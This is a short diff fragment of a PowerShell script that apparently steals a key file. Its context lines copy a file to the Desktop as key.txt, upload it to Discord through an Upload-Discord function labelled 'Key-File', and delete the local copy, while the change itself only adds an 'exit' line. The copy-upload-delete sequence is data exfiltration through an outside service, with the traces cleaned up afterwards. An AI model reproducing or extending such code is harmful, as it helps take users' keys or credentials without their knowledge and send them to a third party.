@@ -32,3 +32,4 @@ $outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt"
 Copy-Item $sourceFile2 $outputFile2
 Upload-Discord -file $outputFile2 -text "Key-File"
 Remove-Item $outputFile2
+exit
